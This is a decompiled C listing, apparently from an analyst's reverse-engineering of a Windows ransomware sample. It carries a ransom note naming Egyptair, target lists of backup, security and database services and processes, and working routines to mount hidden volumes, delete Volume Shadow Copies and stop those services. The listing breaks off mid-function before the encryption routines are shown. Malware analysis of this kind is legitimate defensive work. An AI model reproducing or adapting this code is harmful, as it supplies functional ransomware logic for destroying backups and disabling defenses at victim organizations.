/* This file was generated by the Hex-Rays decompiler version 9.1.0.250226.
   Copyright (c) 2007-2021 Hex-Rays <info@hex-rays.com>

   Detected compiler: Visual C++
*/

#include <windows.h>
#include <defs.h>


//-------------------------------------------------------------------------
// Function declarations

__int64 sub_7FF6E55A48C0();
__int64 sub_7FF6E55A48E0();
void __fastcall sub_7FF6E55A4900(void *a1);
int fn_MountAllVolumes();
__int64 fn_checkBackup_and_emptyBins();
int fn_StopSecurityServices();
BOOL fn_TerminateSecurityProcesses();
__int64 sub_7FF6E55A5390();
_QWORD *__fastcall sub_7FF6E55A5400(_QWORD *a1);
_QWORD *__fastcall sub_7FF6E55A5420(_QWORD *a1);
__int64 __fastcall sub_7FF6E55A5440(_QWORD *a1);
__int64 __fastcall sub_7FF6E55A5460(_QWORD *a1);
__int64 __fastcall sub_7FF6E55A5490(__int64 a1);
__int64 __fastcall sub_7FF6E55A54A0(__int64 a1);
__int64 fn_CreateVssBackupComponentsInternal();
__int64 __fastcall sub_7FF6E55A54D0(__int64 a1);
char __fastcall fn_check_commandLine_Flag(int a1, __int64 a2, _WORD *a3);
__int64 __fastcall sub_7FF6E55A55C0(int a1, __int64 a2, int a3);
_WORD *__fastcall fn_get_CommandLine_Argv(int a1, __int64 a2, unsigned __int16 *a3);
void __fastcall sub_7FF6E55A5740(const CHAR *, const CHAR *, int);
BOOL fn_cleanup_lock_and_handle();
__int64 __fastcall sub_7FF6E55A5970(__int64 a1, __int64 a2, unsigned __int16 *a3);
__int64 __fastcall sub_7FF6E55A5AA0(__int64 a1, __int64 a2);
__int64 __fastcall sub_7FF6E55A5B30(__int64 a1, __int64 a2);
__int64 __fastcall sub_7FF6E55A5B90(__int64 a1, __int64 a2, __int64 a3);
__int64 __fastcall sub_7FF6E55A5BF0(_QWORD *a1, int *a2, int *a3);
__int64 __fastcall sub_7FF6E55A6E10(_QWORD *a1);
__int64 __fastcall sub_7FF6E55A7440(__int64 a1);
__int64 __fastcall sub_7FF6E55A7490(__int64 a1);
__int64 __fastcall sub_7FF6E55A74E0(__int64 *a1);
unsigned __int64 __fastcall sub_7FF6E55A7750(__int64 a1, int *a2, int *a3);
__int64 __fastcall sub_7FF6E55A77C0(_QWORD *a1, int *a2);
unsigned __int64 __fastcall sub_7FF6E55A8280(__int64 a1, int *a2);
__int64 __fastcall sub_7FF6E55A82E0(_QWORD *a1, unsigned __int16 *a2);
__int64 __fastcall sub_7FF6E55A87B0(int a1, int a2);
__int64 __fastcall sub_7FF6E55A8840(int a1, int a2);
__int64 __fastcall sub_7FF6E55A8870(__int64 a1, __int64 a2);
__int64 __fastcall sub_7FF6E55A9570(__int64 *a1, __int64 *a2, __int64 a3, __int64 a4, int *a5, int *a6, int *a7, int *a8, int *a9);
__int64 __fastcall sub_7FF6E55A9860(__int64 a1, __int64 a2, __int64 a3);
unsigned __int64 __fastcall sub_7FF6E55A9910(__int64 a1, __int64 a2, __int64 a3, int *a4);
unsigned __int64 __fastcall sub_7FF6E55A9CE0(__int64 a1, int *a2);
int __fastcall fn_main_logic_encrypt(const WCHAR *);
int __fastcall fn_logic_filter_file(const WCHAR *a1);
int __fastcall fn_walk_directory_recursive(const WCHAR *);
DWORD __fastcall fn_Enumerate_Network_Resoures(struct _NETRESOURCEW *a1);
DWORD __fastcall fn_handle_option_shares(WCHAR *a1);
int sub_7FF6E55AC070();
__int64 __fastcall sub_7FF6E55AC800(__int64 a1);
__int64 __fastcall sub_7FF6E55AC840(_DWORD *a1, int *a2);
__int64 __fastcall sub_7FF6E55B01F0(_DWORD *a1);
__int64 __fastcall sub_7FF6E55B35D0(__int64 a1, __int64 a2, unsigned int a3, int a4);
__int64 __fastcall sub_7FF6E55B3690(_DWORD *a1, __int64 a2);
_DWORD *__fastcall fn_ChaCha20_Encrypt(__int64 a1, _DWORD *a2, _DWORD *a3, int *a4, unsigned int a5);
__int64 __fastcall sub_7FF6E55B3F80(_BYTE *a1, int a2);
__int64 __fastcall sub_7FF6E55B3FF0(__int64 a1);
__int64 __fastcall sub_7FF6E55B4050(__int64 a1, __int64 a2, int a3);
__int64 __fastcall sub_7FF6E55B43E0(__int64 a1, __int64 a2);
__int64 __fastcall sub_7FF6E55B4750(__int64 a1, int a2, __int64 a3);
__int64 __fastcall sub_7FF6E55B47B0(__int64 a1);
__int64 __fastcall sub_7FF6E55B4800(__int64 a1, __int64 a2);
unsigned __int64 __fastcall fn_memset(__int64 a1, char a2, unsigned __int64 a3);
unsigned __int64 __fastcall sub_7FF6E55B7830(__int64 a1, __int64 a2, unsigned __int64 a3);
LPVOID __fastcall fn_call_HeapAlloc(__int64);
BOOL __fastcall fn_call_HeapFree(void *);
__int64 __fastcall fn_ring_queue_dequeue_wstr(__int64 a1, int a2, _DWORD *a3);
__int64 __fastcall fn_ring_queue_enqueue_wstr(__int64 a1, const WCHAR *a2, int a3);
// HANDLE __stdcall CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL __stdcall Process32FirstW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// BOOL __stdcall Process32NextW(HANDLE hSnapshot, LPPROCESSENTRY32W lppe);
// __int64 __fastcall VssFreeSnapshotPropertiesInternal(_QWORD); weak
// DWORD __stdcall NetShareEnum(LPWSTR servername, DWORD level, LPBYTE *bufptr, DWORD prefmaxlen, LPDWORD entriesread, LPDWORD totalentries, LPDWORD resume_handle);
// DWORD __stdcall NetApiBufferFree(LPVOID Buffer);
// DWORD __stdcall WNetOpenEnumW(DWORD dwScope, DWORD dwType, DWORD dwUsage, LPNETRESOURCEW lpNetResource, LPHANDLE lphEnum);
// DWORD __stdcall WNetEnumResourceW(HANDLE hEnum, LPDWORD lpcCount, LPVOID lpBuffer, LPDWORD lpBufferSize);
// DWORD __stdcall WNetCloseEnum(HANDLE hEnum);

//-------------------------------------------------------------------------
// Data declarations

const WCHAR word_7FF6E55A1D28 = 92u; // idb
const CHAR Buffer[442] = "================================================================================\n                            ATTENTION Egyptair\n                        YOUR NETWORK HAS BEEN COMPROMISED\n================================================================================\n\nDear Egyptair Management,\n\nYour corporate network has been successfully infiltrated and encrypted by our \nadvanced ransomware system. All critical business data, including:\n\n"; // idb
__int64 qword_7FF6E55A4030[128] =
{
  342587718473089024LL,
  955650259541965678LL,
  1712893340909074140LL,
  2181800527334362546LL,
  2506798615461686712LL,
  3119810785154094806LL,
  3588672719770393444LL,
  4057670409746554890LL,
  5246912125163658096LL,
  4707103464014209054LL,
  6617107384119963052LL,
  5933082895187416770LL,
  7987181765382452936LL,
  7447282600682130854LL,
  9069226706310348820LL,
  8385252588754271098LL,
  -7141957666353203488LL,
  -7682982387363246706LL,
  -8077525290237575108LL,
  -8762625101542327470LL,
  -4978088442603021480LL,
  -5519023347256958922LL,
  -6201966638335578748LL,
  -6887117233333659926LL,
  -3390242778113741424LL,
  -2778356714486868226LL,
  -4325981238617302196LL,
  -3858109792145629150LL,
  -649752410935623640LL,
  -37815563615421626LL,
  -1873520243188500748LL,
  -1405738613072933478LL,
  3478869909449371767LL,
  4162828736921881369LL,
  2540904422502958763LL,
  3080779294868258245LL,
  1607644845190323663LL,
  2291693489018939041LL,
  381669777703889683LL,
  921493866375860349LL,
  8959549377753885447LL,
  8490567184019722345LL,
  8021685458194128347LL,
  7408697374678312629LL,
  6511742202729678527LL,
  6042810792688844241LL,
  5285587502531031139LL,
  4672509602659109645LL,
  -6312679844284610921LL,
  -6780485560576770567LL,
  -4944761089794396085LL,
  -5556713433356596443LL,
  -8184106394049500369LL,
  -8651962481718128575LL,
  -7104357748796989965LL,
  -7716219588808317283LL,
  -1984679713419551257LL,
  -1299504826086447479LL,
  -616581326217123013LL,
  -75631131479617451LL,
  -4432124874240233377LL,
  -3747040490458002639LL,
  -3352477796374378877LL,
  -2811477230260404755LL,
  7912258680816197870LL,
  7228213868098411392LL,
  9135986724492056114LL,
  8596158839068994908LL,
  5459788683135946070LL,
  4775833824213218872LL,
  6395505359565388682LL,
  5855626553010045156LL,
  2439867056286153630LL,
  2908794600856420592LL,
  3663767310970735938LL,
  4276849110672963116LL,
  564299677010613798LL,
  1033278142713163080LL,
  1499906814594097402LL,
  2112898660501265300LL,
  -725559227972626930LL,
  -257707005774566048LL,
  -1807564792640364334LL,
  -1195699052798731332LL,
  -3177669960228422730LL,
  -2709867971967876904LL,
  -4547843022793749142LL,
  -3935886916840196604LL,
  -5044153861493846658LL,
  -5729234414165248496LL,
  -6126049887315625054LL,
  -6667054250180689716LL,
  -6919924375542669114LL,
  -7605095294325990488LL,
  -8290269649116719590LL,
  -8831223778044269196LL,
  6434391722906259609LL,
  5821384380757093367LL,
  5354775500085454405LL,
  4885772948206312747LL,
  9170279465689972001LL,
  8557221889603290703LL,
  7802229388279679997LL,
  7333317202512457875LL,
  1538637184722750441LL,
  2078531281361662087LL,
  458839954800196917LL,
  1142819106057946715LL,
  3698224841473893969LL,
  4238028572000886079LL,
  2330275506816536717LL,
  3014304892011801571LL,
  -4510289267546052999LL,
  -3969359430953525993LL,
  -3284165284953501531LL,
  -2599009656253748277LL,
  -1774182447070458943LL,
  -1233162656682872657LL,
  -836366974741791459LL,
  -151262267174320525LL,
  -8252317733220713207LL,
  -8864249752997673369LL,
  -7026294493381096491LL,
  -7494080985399643973LL,
  -6093074498487054159LL,
  -6704955597131732001LL,
  -5155078019056638355LL,
  -5622954464870245117LL
}; // weak
__int64 qword_7FF6E55A4430[8] =
{
  -883610388895504793LL,
  -8878099840418468219LL,
  -102184026941492366LL,
  6853694619416261946LL,
  -5915897224984898945LL,
  3116046875187570828LL,
  -341783828915562069LL,
  1404596938902392089LL
}; // weak
__int64 qword_7FF6E55A4470[80] =
{
  -2942910894318145640LL,
  2589400243803473041LL,
  -1419413231453013041LL,
  -9112510766586143835LL,
  -916283271085112741LL,
  -5330625776621383183LL,
  -5829540713062235484LL,
  -2707365858029838635LL,
  -6700509334481687912LL,
  5003622048153688833LL,
  5684864944620799422LL,
  -3026501540387193405LL,
  -974033782636126860LL,
  4257756186840838654LL,
  2722164521226208935LL,
  -3501224814958612108LL,
  -6993726476690691647LL,
  4057503450194134918LL,
  -8391097032067932730LL,
  8623439344718094796LL,
  6425231995678829679LL,
  7973311442847040682LL,
  -4809286037548258852LL,
  -9002322141286659878LL,
  -1268080316971593390LL,
  3293312274637375085LL,
  -7423303003370477624LL,
  -4688512311443750969LL,
  4442959099123993587LL,
  -7851279219426881209LL,
  -2304855170916654255LL,
  724638017706862951LL,
  5103194087808764549LL,
  6640215866423845176LL,
  6540399757539175932LL,
  -7091564266469716717LL,
  -8381370574684130476LL,
  4357147601115155131LL,
  5182991051216046382LL,
  1477802157707242629LL,
  5544216347031890081LL,
  -4881286262442793397LL,
  -3388792067310515344LL,
  456198578984735139LL,
  -2959056163610367975LL,
  6153510355656574500LL,
  6300852722523321733LL,
  3655746111020900464LL,
  -5128807467779309290LL,
  5855149364035939336LL,
  -2337672113537124532LL,
  -2190076906509910859LL,
  -4194722195712504653LL,
  -2071221747807901110LL,
  8602969797805525583LL,
  -2976113391771422733LL,
  6768825562318209774LL,
  4834384816392987503LL,
  -6777728930850244588LL,
  1901708630794109448LL,
  2549914973597794298LL,
  -2413157639135400725LL,
  -5564627155264363529LL,
  -2057490632276870926LL,
  -1574463693685047602LL,
  2432157137615894727LL,
  -3611628383129403946LL,
  -1265844127799619713LL,
  8221162489559148458LL,
  -6716951005316809275LL,
  -4685698896037439484LL,
  1377053767818611509LL,
  2523279697808947189LL,
  4667739753423743867LL,
  1569995660795493898LL,
  -7201241182970746940LL,
  -3801527684714605378LL,
  -259662683148703332LL,
  4239851992342294443LL,
  5352343539777018252LL
}; // weak
__int64 qword_7FF6E55A46F0[2] = { 0LL, 0LL }; // weak
char *gn_services[43] =
{
  "vss",
  "sql",
  "svc$",
  "memtas",
  "mepocs",
  "sophos",
  "veeam",
  "backup",
  "GxVss",
  "GxBlr",
  "GxFWD",
  "GxCVD",
  "GxCIMgr",
  "DefWatch",
  "ccEvtMgr",
  "ccSetMgr",
  "SavRoam",
  "RTVscan",
  "QBFCService",
  "QBIDPService",
  "Intuit.QuickBooks.FCS",
  "QBCFMonitorService",
  "YooBackup",
  "YooIT",
  "zhudongfangyu",
  "stc_raw_agent",
  "VSNAPVSS",
  "VeeamTransportSvc",
  "VeeamDeploymentService",
  "VeeamNFSSvc",
  "veeam",
  "PDVFSService",
  "BackupExecVSSProvider",
  "BackupExecAgentAccelerator",
  "BackupExecAgentBrowser",
  "BackupExecDiveciMediaService",
  "BackupExecJobEngine",
  "BackupExecManagementService",
  "BackupExecRPCService",
  "AcrSch2Svc",
  "AcronisAgent",
  "CASAD2DWebSvc",
  "CAARCUpdateSvc"
}; // weak
wchar_t *gn_security_process[31] =
{
  L"sql.exe",
  L"oracle.exe",
  L"ocssd.exe",
  L"dbsnmp.exe",
  L"synctime.exe",
  L"agntsvc.exe",
  L"isqlplussvc.exe",
  L"xfssvccon.exe",
  L"mydesktopservice.exe",
  L"ocautoupds.exe",
  L"encsvc.exe",
  L"firefox.exe",
  L"tbirdconfig.exe",
  L"mydesktopqos.exe",
  L"ocomm.exe",
  L"dbeng50.exe",
  L"sqbcoreservice.exe",
  L"excel.exe",
  L"infopath.exe",
  L"msaccess.exe",
  L"mspub.exe",
  L"onenote.exe",
  L"outlook.exe",
  L"powerpnt.exe",
  L"steam.exe",
  L"thebat.exe",
  L"thunderbird.exe",
  L"visio.exe",
  L"winword.exe",
  L"wordpad.exe",
  L"notepad.exe"
}; // weak
LPCWSTR gn_folder[1] = { NULL }; // weak
HANDLE hObject = NULL; // idb
struct _RTL_CRITICAL_SECTION CriticalSection = { NULL, 0, 0, NULL, NULL, 0uLL }; // idb
_UNKNOWN unk_7FF6E55BBAA0; // weak
_UNKNOWN unk_7FF6E55BBAF0; // weak
int dword_7FF6E55BBB40 = 0; // weak
// extern SC_HANDLE (__stdcall *OpenSCManagerW)(LPCWSTR lpMachineName, LPCWSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *QueryServiceStatusEx)(SC_HANDLE hService, SC_STATUS_TYPE InfoLevel, LPBYTE lpBuffer, DWORD cbBufSize, LPDWORD pcbBytesNeeded);
// extern SC_HANDLE (__stdcall *OpenServiceA)(SC_HANDLE hSCManager, LPCSTR lpServiceName, DWORD dwDesiredAccess);
// extern SC_HANDLE (__stdcall *OpenSCManagerA)(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *EnumDependentServicesA)(SC_HANDLE hService, DWORD dwServiceState, LPENUM_SERVICE_STATUSA lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned);
// extern BOOL (__stdcall *ControlService)(SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus);
// extern BOOL (__stdcall *CloseServiceHandle)(SC_HANDLE hSCObject);
// extern SC_HANDLE (__stdcall *OpenServiceW)(SC_HANDLE hSCManager, LPCWSTR lpServiceName, DWORD dwDesiredAccess);
// extern BOOL (__stdcall *StartServiceW)(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCWSTR *lpServiceArgVectors);
// extern DWORD (__stdcall *GetTickCount)();
// extern HMODULE (__stdcall *GetModuleHandleA)(LPCSTR lpModuleName);
// extern FARPROC (__stdcall *GetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
// extern int (__stdcall *lstrcmpW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *lstrlenW)(LPCWSTR lpString);
// extern BOOL (__stdcall *SetVolumeMountPointW)(LPCWSTR lpszVolumeMountPoint, LPCWSTR lpszVolumeName);
// extern HANDLE (__stdcall *CreateFileW)(LPCWSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDisposition, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);
// extern BOOL (__stdcall *WriteFile)(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped);
// extern void (__stdcall *EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern void (__stdcall *DeleteCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
// extern int (__stdcall *lstrlenA)(LPCSTR lpString);
// extern BOOL (__stdcall *FindClose)(HANDLE hFindFile);
// extern HANDLE (__stdcall *FindFirstFileW)(LPCWSTR lpFileName, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *FindNextFileW)(HANDLE hFindFile, LPWIN32_FIND_DATAW lpFindFileData);
// extern BOOL (__stdcall *TerminateProcess)(HANDLE hProcess, UINT uExitCode);
// extern DWORD (__stdcall *WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);
// extern int (__stdcall *lstrcmpiW)(LPCWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcpyW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern LPWSTR (__stdcall *lstrcatW)(LPWSTR lpString1, LPCWSTR lpString2);
// extern int (__stdcall *WideCharToMultiByte)(UINT CodePage, DWORD dwFlags, LPCWCH lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cbMultiByte, LPCCH lpDefaultChar, LPBOOL lpUsedDefaultChar);
// extern BOOL (__stdcall *ReleaseSemaphore)(HANDLE hSemaphore, LONG lReleaseCount, LPLONG lpPreviousCount);
// extern HANDLE (__stdcall *OpenProcess)(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
// extern HANDLE (__stdcall *GetCurrentProcess)();
// extern void (__stdcall *Sleep)(DWORD dwMilliseconds);
// extern HANDLE (__stdcall *GetProcessHeap)();
// extern BOOL (__stdcall *HeapFree)(HANDLE hHeap, DWORD dwFlags, LPVOID lpMem);
// extern DWORD (__stdcall *GetLastError)();
// extern BOOL (__stdcall *CloseHandle)(HANDLE hObject);
// extern BOOL (__stdcall *GetVolumePathNamesForVolumeNameW)(LPCWSTR lpszVolumeName, LPWCH lpszVolumePathNames, DWORD cchBufferLength, PDWORD lpcchReturnLength);
// extern UINT (__stdcall *GetDriveTypeW)(LPCWSTR lpRootPathName);
// extern BOOL (__stdcall *FindVolumeClose)(HANDLE hFindVolume);
// extern BOOL (__stdcall *FindNextVolumeW)(HANDLE hFindVolume, LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern HANDLE (__stdcall *FindFirstVolumeW)(LPWSTR lpszVolumeName, DWORD cchBufferLength);
// extern HRESULT (__stdcall *CoInitialize)(LPVOID pvReserved);
// extern HRESULT (__stdcall *CoInitializeSecurity)(PSECURITY_DESCRIPTOR pSecDesc, LONG cAuthSvc, SOLE_AUTHENTICATION_SERVICE *asAuthSvc, void *pReserved1, DWORD dwAuthnLevel, DWORD dwImpLevel, void *pAuthList, DWORD dwCapabilities, void *pReserved3);


//----- (00007FF6E55A48C0) ----------------------------------------------------
__int64 sub_7FF6E55A48C0()
{
  return sub_7FF6E55AC800((__int64)&unk_7FF6E55BBAA0);
}

//----- (00007FF6E55A48E0) ----------------------------------------------------
__int64 sub_7FF6E55A48E0()
{
  return sub_7FF6E55AC800((__int64)&unk_7FF6E55BBAF0);
}

//----- (00007FF6E55A4900) ----------------------------------------------------
void __fastcall sub_7FF6E55A4900(void *a1)
{
  HANDLE ProcessHeap; // rax

  if ( a1 )
  {
    ProcessHeap = GetProcessHeap();
    HeapFree(ProcessHeap, 0, a1);
  }
}

//----- (00007FF6E55A4940) ----------------------------------------------------
int fn_MountAllVolumes()
{
  WCHAR *v0; // rax
  unsigned int v2; // [rsp+20h] [rbp-3E8h]
  int i; // [rsp+24h] [rbp-3E4h]
  WCHAR *lpszVolumeName; // [rsp+28h] [rbp-3E0h]
  DWORD cchReturnLength; // [rsp+30h] [rbp-3D8h] BYREF
  DWORD cchBufferLength; // [rsp+34h] [rbp-3D4h]
  HANDLE hFindVolume; // [rsp+38h] [rbp-3D0h]
  void *v8; // [rsp+40h] [rbp-3C8h]
  LPCWSTR lpRootPathName[52]; // [rsp+50h] [rbp-3B8h]
  WCHAR szVolumePathNames[268]; // [rsp+1F0h] [rbp-218h] BYREF

  lpRootPathName[0] = L"Q:\\";
  lpRootPathName[1] = L"W:\\";
  lpRootPathName[2] = L"E:\\";
  lpRootPathName[3] = L"R:\\";
  lpRootPathName[4] = L"T:\\";
  lpRootPathName[5] = L"Y:\\";
  lpRootPathName[6] = L"U:\\";
  lpRootPathName[7] = L"I:\\";
  lpRootPathName[8] = L"O:\\";
  lpRootPathName[9] = L"P:\\";
  lpRootPathName[10] = L"A:\\";
  lpRootPathName[11] = L"S:\\";
  lpRootPathName[12] = L"D:\\";
  lpRootPathName[13] = L"F:\\";
  lpRootPathName[14] = L"G:\\";
  lpRootPathName[15] = L"H:\\";
  lpRootPathName[16] = L"J:\\";
  lpRootPathName[17] = L"K:\\";
  lpRootPathName[18] = L"L:\\";
  lpRootPathName[19] = L"Z:\\";
  lpRootPathName[20] = L"X:\\";
  lpRootPathName[21] = L"C:\\";
  lpRootPathName[22] = L"V:\\";
  lpRootPathName[23] = L"B:\\";
  lpRootPathName[24] = L"N:\\";
  lpRootPathName[25] = L"M:\\";
  v2 = 0;
  cchBufferLength = 120;
  cchReturnLength = 0;
  for ( i = 0; i < 26; ++i )
  {
    if ( GetDriveTypeW(lpRootPathName[i]) == 1 )
      lpRootPathName[v2++ + 26] = lpRootPathName[i];
  }
  szVolumePathNames[0] = 0;
  v0 = (WCHAR *)fn_call_HeapAlloc(0x10000);
  lpszVolumeName = v0;
  if ( v0 )
  {
    v8 = fn_call_HeapAlloc(0x10000);
    if ( v8 )
    {
      hFindVolume = FindFirstVolumeW(lpszVolumeName, 0x8000u);
      do
      {
        if ( !v2 )
          break;
        if ( GetVolumePathNamesForVolumeNameW(lpszVolumeName, szVolumePathNames, cchBufferLength, &cchReturnLength)
          && lstrlenW(szVolumePathNames) == 3 )
        {
          szVolumePathNames[0] = 0;
        }
        else
        {
          SetVolumeMountPointW(lpRootPathName[--v2 + 26], lpszVolumeName);
        }
      }
      while ( FindNextVolumeW(hFindVolume, lpszVolumeName, 0x8000u) );
      FindVolumeClose(hFindVolume);
      fn_call_HeapFree(v8);
    }
    LODWORD(v0) = fn_call_HeapFree(lpszVolumeName);
  }
  return (int)v0;
}
// 7FF6E55A16D8: using guessed type wchar_t aQ[4];
// 7FF6E55A16E0: using guessed type wchar_t aW[4];
// 7FF6E55A16E8: using guessed type wchar_t aE[4];
// 7FF6E55A16F0: using guessed type wchar_t aR[4];
// 7FF6E55A16F8: using guessed type wchar_t aT[4];
// 7FF6E55A1700: using guessed type wchar_t aY[4];
// 7FF6E55A1708: using guessed type wchar_t aU[4];
// 7FF6E55A1710: using guessed type wchar_t aI[4];
// 7FF6E55A1718: using guessed type wchar_t aO[4];
// 7FF6E55A1720: using guessed type wchar_t aP[4];
// 7FF6E55A1728: using guessed type wchar_t aA[4];
// 7FF6E55A1730: using guessed type wchar_t aS[4];
// 7FF6E55A1738: using guessed type wchar_t aD[4];
// 7FF6E55A1740: using guessed type wchar_t asc_7FF6E55A1740[4];
// 7FF6E55A1748: using guessed type wchar_t aG[4];
// 7FF6E55A1750: using guessed type wchar_t asc_7FF6E55A1750[4];
// 7FF6E55A1758: using guessed type wchar_t aJ[4];
// 7FF6E55A1760: using guessed type wchar_t aK[4];
// 7FF6E55A1768: using guessed type wchar_t asc_7FF6E55A1768[4];
// 7FF6E55A1770: using guessed type wchar_t aZ[4];
// 7FF6E55A1798: using guessed type wchar_t asc_7FF6E55A1798[4];
// 7FF6E55A17A0: using guessed type wchar_t aC[4];
// 7FF6E55A17A8: using guessed type wchar_t aV[4];
// 7FF6E55A17B0: using guessed type wchar_t aB[4];
// 7FF6E55A17B8: using guessed type wchar_t aN[4];
// 7FF6E55A17C0: using guessed type wchar_t aM[4];

//----- (00007FF6E55A4C50) ----------------------------------------------------
__int64 fn_checkBackup_and_emptyBins()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  CoInitialize(0);
  CoInitializeSecurity(0, -1, 0, 0, 6u, 2u, 0, 0, 0);// initialize COM security with RPC\_C\_AUTHN\_LEVEL\_CONNECT (6) and RPC\_C\_IMP\_LEVEL\_IMPERSONATE (2)
  result = fn_CreateVssBackupComponentsInternal();// create VSS backup component interface
  if ( (_DWORD)result != 0x80070005 )
  {
    v10 = *(void (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v4 + 40LL);
    v10(v4, 0);                                 // initialize VSS for backup ops
    v11 = *(void (__fastcall **)(__int64, __int64))(*(_QWORD *)v4 + 280LL);
    v11(v4, 0xFFFFFFFFLL);                      // set context to 0xFFFFFFFF to get all shadow copies
    v12 = *(void (__fastcall **)(__int64, __int64, __int64, __int64, int))(*(_QWORD *)v4 + 48LL);
    LOBYTE(dwAuthnLevel) = 0;
    LOBYTE(v1) = 1;
    LOBYTE(v2) = 1;
    v12(v4, v2, v1, 1, dwAuthnLevel);           // setup backup state
    sub_7FF6E55A5400(&v5);
    v14 = *(unsigned int (__fastcall **)(__int64, _BYTE *, __int64, __int64, __int64))(*(_QWORD *)v4 + 344LL);
    v13 = sub_7FF6E55A54A0((__int64)&v5);
    qmemcpy(v17, qword_7FF6E55A46F0, sizeof(v17));
    qmemcpy(v18, v17, sizeof(v18));
    qmemcpy(v19, v18, sizeof(v19));
    if ( v14(v4, v19, 1, 3, v13) != 1 )         // query for existing shadow copies
    {
      v9 = &v23;
      while ( 1 )                               // deletion loop
      {
        v8 = sub_7FF6E55A5490((__int64)&v5);
        v15 = *(void (__fastcall **)(__int64, __int64, _BYTE *, int *))(*(_QWORD *)v8 + 24LL);
        v15(v8, 1, v22, &v6);                   // get properties for each shadow copy found
        if ( !v6 )
          break;
        sub_7FF6E55A54D0((__int64)v9);
        v7 = 0;
        qmemcpy(v20, qword_7FF6E55A46F0, sizeof(v20));
        v16 = *(void (__fastcall **)(__int64, _BYTE *, __int64, _QWORD, int *, _BYTE *))(*(_QWORD *)v4 + 312LL);
        qmemcpy(v21, v9, sizeof(v21));
        v16(v4, v21, 3, 0, &v7, v20);           // delete the shadow copy
      }
    }
    return sub_7FF6E55A5440(&v5);
  }
  return result;
}
// 1B: found interdependent unknown calls
// 7FF6E55A4CC9: variable 'v4' is possibly undefined
// 7FF6E55A4D37: variable 'v2' is possibly undefined
// 7FF6E55A4D37: variable 'v1' is possibly undefined
// 7FF6E55A4D37: variable 'dwAuthnLevel' is possibly undefined
// 7FF6E55A46F0: using guessed type __int64 qword_7FF6E55A46F0[2];

//----- (00007FF6E55A4F30) ----------------------------------------------------
int fn_StopSecurityServices()
{
  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD "+" TO EXPAND]

  lpServices = 0;
  TickCount = GetTickCount();
  v7 = 30000;
  v0 = OpenSCManagerA(0, 0, 0xF003Fu);
  hSCManager = v0;
  if ( v0 )
  {
    for ( i = 0; (unsigned __int64)i < 0x2B; ++i )
    {
      hService = OpenServiceA(hSCManager, gn_services[i], 0x2Cu);
      if ( hService )
      {
        if ( QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &cbBufSize)
          && Buffer.dwCurrentState != 1
          && Buffer.dwCurrentState != 3 )
        {
          if ( !EnumDependentServicesA(hService, 1u, lpServices, 0, &cbBufSize, &ServicesReturned)
            && GetLastError() == 234 )
          {
            lpServices = (LPENUM_SERVICE_STATUSA)fn_call_HeapAlloc(cbBufSize);
            if ( lpServices )
            {
              if ( EnumDependentServicesA(hService, 1u, lpServices, cbBufSize, &cbBufSize, &ServicesReturned) )
              {
                qmemcpy(lpServiceName, &lpServices[i], sizeof(lpServiceName));
                hSCObject = OpenServiceA(hSCManager, lpServiceName[0], 0x24u);
                if ( hSCObject )
                {
                  if ( ControlService(hSCObject, 1u, &ServiceStatus) )
                  {
                    while ( ServiceStatus.dwCurrentState != 1 )
                    {
                      Sleep(ServiceStatus.dwWaitHint);
                      if ( QueryServiceStatusEx(
                             hSCObject,
                             SC_STATUS_PROCESS_INFO,
                             (LPBYTE)&ServiceStatus,
                             0x24u,
                             &cbBufSize) )
                      {
                        if ( ServiceStatus.dwCurrentState == 1 || GetTickCount() - TickCount > v7 )
                          break;
                      }
                    }
                    CloseServiceHandle(hSCObject);
                  }
                }
              }
              fn_call_HeapFree(lpServices);
            }
          }
          if ( ControlService(hService, 1u, &Buffer) )
          {
            do
            {
              if ( Buffer.dwCurrentState == 1 )
                break;
              Sleep(Buffer.dwWaitHint);
              if ( !QueryServiceStatusEx(hService, SC_STATUS_PROCESS_INFO, (LPBYTE)&Buffer, 0x24u, &cbBufSize) )
                break;
            }
            while ( Buffer.dwCurrentState != 1 && GetTickCount() - TickCount <= v7 );
          }
        }
        CloseServiceHandle(hService);
      }
    }
    LODWORD(v0) = CloseServiceHandle(hSCManager);
  }
  return (int)v0;
}
// 7FF6E55B8000: using guessed type char *gn_services[43];

//----- (00007FF6E55A5230) ----------------------------------------------------
BOOL fn_TerminateSecurityProcesses()
{
  int j; // [rsp+20h] [rbp-268h]
  BOOL i; // [rsp+24h] [rbp-264h]
  HANDLE hProcess; // [rsp+28h] [rbp-260h]
  HANDLE hSnapshot; // [rsp+30h] [rbp-258h]
  PROCESSENTRY32W pe; // [rsp+40h] [rbp-248h] BYREF

  hSnapshot = CreateToolhelp32Snapshot(0xFu, 0);
  pe.dwSize = 568;
